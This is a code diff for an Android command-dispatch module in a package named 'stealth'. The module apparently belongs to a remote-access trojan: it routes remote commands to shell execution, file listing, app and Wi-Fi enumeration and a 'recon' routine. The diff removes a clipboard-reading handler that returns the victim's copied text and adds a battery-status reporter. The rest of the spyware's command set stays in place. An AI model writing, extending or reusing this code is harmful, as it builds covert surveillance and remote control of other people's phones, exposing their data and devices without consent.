@@ -1,11 +1,10 @@
 package com.kaze.stealth
 
-import android.content.ClipboardManager
 import android.content.Context
 import android.net.wifi.WifiManager
+import android.os.BatteryManager
 import android.os.Build
 import android.os.Environment
-import android.provider.ContactsContract
 import java.io.BufferedReader
 import java.io.File
 import java.io.InputStreamReader
@@ -26,7 +25,7 @@ object Commands {
             "info" -> deviceInfo()
             "apps" -> getApps(context)
             "shell" -> shell(arg)
-            "clipboard" -> clipboard(context)
+            "battery" -> battery(context)
             "files" -> files(arg)
             "wifi" -> wifi(context)
             "recon" -> Recon.execute(context)
@@ -90,15 +89,26 @@ object Commands {
         }
     }
 
-    private fun clipboard(context: Context): String {
+    private fun battery(context: Context): String {
         return try {
-            val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
-            if (cm.hasPrimaryClip() && cm.primaryClip?.getItemAt(0) != null) {
-                val text = cm.primaryClip!!.getItemAt(0).text
-                text?.toString() ?: "EMPTY"
-            } else {
-                "EMPTY"
+            val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
+            val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
+            val status = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS)
+            val statusStr = when (status) {
+                2 -> "CHARGING"
+                5 -> "FULL"
+                3 -> "DISCHARGING"
+                else -> "UNKNOWN($status)"
             }
+            val intent = context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
+            val temp = intent?.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0
+            val voltage = intent?.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, 0) ?: 0
+            val sb = StringBuilder()
+            sb.append("LEVEL:").append(level).append("%\n")
+            sb.append("STATUS:").append(statusStr).append("\n")
+            sb.append("TEMP:").append(temp / 10.0).append("C\n")
+            sb.append("VOLTAGE:").append(voltage).append("mV\n")
+            sb.toString()
         } catch (e: Exception) {
             "ERROR:${e.message}"
         }
